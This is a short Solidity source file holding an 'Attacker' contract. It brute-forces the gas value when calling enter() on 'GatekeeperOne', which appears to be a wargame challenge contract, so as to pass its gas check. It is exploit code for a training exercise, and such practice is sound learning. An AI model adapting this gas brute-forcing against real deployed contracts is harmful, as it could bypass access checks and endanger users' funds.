/**
 *Submitted for verification at polygonscan.com on 2023-04-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    IGatekeeperOne challenge;
    
    constructor(address _address) {
        challenge = IGatekeeperOne(_address);
    }

    function attack(bytes8 _data, uint _from, uint _till) public {
        for (uint i = _from; i <= _till; i++) {
            challenge.enter{gas: 800000 + i}(_data);
        }
    }
}